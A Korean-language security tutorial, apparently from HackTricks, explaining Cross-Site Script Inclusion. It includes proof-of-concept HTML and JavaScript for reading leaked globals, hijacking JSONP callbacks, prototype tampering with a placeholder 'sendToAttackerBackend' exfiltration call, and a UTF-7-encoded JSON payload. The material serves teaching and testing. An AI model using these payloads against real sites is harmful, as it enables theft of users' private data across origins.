# XSSI (Cross-Site Script Inclusion)

{{#include ../banners/hacktricks-training.md}}

## 기본 정보

**Cross-Site Script Inclusion (XSSI)**는 HTML의 `script` 태그의 특성에서 발생하는 취약점입니다. 대부분의 리소스가 **Same-Origin Policy (SOP)**의 적용을 받는 것과 달리, 스크립트는 다른 도메인에서 포함될 수 있습니다. 이 동작은 다른 서버에 호스팅된 라이브러리 및 기타 리소스의 사용을 용이하게 하기 위한 것이지만, 잠재적인 보안 위험도 초래합니다.

### **XSSI**의 주요 특징:

- **SOP 우회**: 스크립트는 **Same-Origin Policy**에서 면제되어 도메인 간에 포함될 수 있습니다.
- **데이터 노출**: 공격자는 이 동작을 이용해 `script` 태그를 통해 로드된 데이터를 읽을 수 있습니다.
- **동적 JavaScript/JSONP에 미치는 영향**: **XSSI**는 동적 JavaScript 또는 **JSON with Padding (JSONP)**와 특히 관련이 있습니다. 이러한 기술은 종종 인증을 위해 "ambient-authority" 정보(예: 쿠키)를 사용합니다. 다른 호스트에 스크립트 요청이 이루어질 때, 이러한 자격 증명(예: 쿠키)은 요청에 자동으로 포함됩니다.
- **인증 토큰 유출**: 공격자가 사용자의 브라우저를 속여 자신이 제어하는 서버에서 스크립트를 요청하게 할 수 있다면, 이러한 요청에 포함된 민감한 정보에 접근할 수 있습니다.

### 유형

1. **정적 JavaScript** - 이는 전통적인 형태의 XSSI를 나타냅니다.
2. **인증이 필요한 정적 JavaScript** - 이 유형은 접근을 위해 인증이 필요하다는 점에서 다릅니다.
3. **동적 JavaScript** - 콘텐츠를 동적으로 생성하는 JavaScript를 포함합니다.
4. **비 JavaScript** - JavaScript와 직접적으로 관련되지 않은 취약점을 나타냅니다.

**다음 정보는 [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)**의 요약입니다. 추가 세부정보는 해당 링크를 확인하세요.

### 일반 XSSI

이 접근 방식에서는 개인 정보가 전 세계에서 접근 가능한 JavaScript 파일에 포함됩니다. 공격자는 파일 읽기, 키워드 검색 또는 정규 표현식과 같은 방법을 사용하여 이러한 파일을 식별할 수 있습니다. 위치가 확인되면, 개인 정보가 포함된 스크립트는 악의적인 콘텐츠에 포함되어 민감한 데이터에 대한 무단 접근을 허용할 수 있습니다. 아래에 예시적인 공격 기법이 나와 있습니다:
```html
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script>
alert(JSON.stringify(confidential_keys[0]))
</script>
```
### Dynamic-JavaScript-based-XSSI 및 Authenticated-JavaScript-XSSI

이러한 유형의 XSSI 공격은 사용자의 요청에 따라 기밀 정보가 동적으로 스크립트에 추가되는 것을 포함합니다. 쿠키가 있는 요청과 없는 요청을 보내고 응답을 비교하여 탐지가 가능합니다. 정보가 다르면 기밀 정보가 존재할 수 있음을 나타낼 수 있습니다. 이 프로세스는 [DetectDynamicJS](https://github.com/luh2/DetectDynamicJS) Burp 확장과 같은 도구를 사용하여 자동화할 수 있습니다.

기밀 데이터가 전역 변수에 저장되어 있는 경우, Regular XSSI에서 사용되는 유사한 방법을 사용하여 악용할 수 있습니다. 그러나 기밀 데이터가 JSONP 응답에 포함된 경우, 공격자는 콜백 함수를 탈취하여 정보를 검색할 수 있습니다. 이는 전역 객체를 조작하거나 JSONP 응답에 의해 실행될 함수를 설정하여 수행할 수 있습니다.
```html
<script>
var angular = function () {
return 1
}
angular.callbacks = function () {
return 1
}
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked))
}
</script>
<script
src="https://site.tld/p?jsonp=angular.callbacks._7"
type="text/javascript"></script>
```

```html
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked))
}
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
전역 네임스페이스에 존재하지 않는 변수의 경우, _prototype tampering_이 때때로 악용될 수 있습니다. 이 기술은 호출된 속성을 찾기 위해 프로토타입 체인을 탐색하는 JavaScript의 설계를 활용합니다. `Array`의 `slice`와 같은 특정 함수를 재정의함으로써, 공격자는 비전역 변수를 접근하고 유출할 수 있습니다:
```javascript
Array.prototype.slice = function () {
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this)
}
```
공격 벡터에 대한 추가 세부정보는 보안 연구원 [Sebastian Lekies](https://twitter.com/slekies)의 작업에서 찾을 수 있으며, 그는 [벡터](http://sebastian-lekies.de/leak/) 목록을 유지하고 있습니다.

### Non-Script-XSSI

Takeshi Terada의 연구는 Non-Script 파일, 예를 들어 CSV가 `script` 태그의 소스로 포함되어 교차 출처로 유출되는 또 다른 형태의 XSSI를 소개합니다. Jeremiah Grossman의 2006년 공격으로 Google 주소록을 완전히 읽고 Joe Walker의 2007년 JSON 데이터 유출과 같은 XSSI의 역사적 사례는 이러한 위협의 심각성을 강조합니다. 또한, Gareth Heyes는 특정 브라우저에서 효과적인 JSON 형식을 탈출하고 스크립트를 실행하기 위해 UTF-7로 인코딩된 JSON을 포함하는 공격 변형을 설명합니다.
```javascript
;[
{
friend: "luke",
email:
"+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-",
},
]
```

```html
<script
src="http://site.tld/json-utf7.json"
type="text/javascript"
charset="UTF-7"></script>
```
{{#include ../banners/hacktricks-training.md}}
